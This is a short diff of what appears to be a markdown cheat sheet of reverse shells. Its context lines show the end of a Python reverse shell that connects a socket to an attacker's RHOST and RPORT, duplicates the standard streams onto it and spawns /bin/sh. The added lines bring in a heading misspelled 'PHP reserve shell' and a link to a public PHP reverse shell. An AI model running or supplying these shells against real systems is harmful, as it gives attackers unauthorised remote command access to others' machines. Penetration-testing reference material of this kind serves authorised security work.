@@ -35,3 +35,7 @@ s.connect((RHOST,int(RPORT)))
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn("/bin/sh")
 ```
+
+## PHP reserve shell
+
+[https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
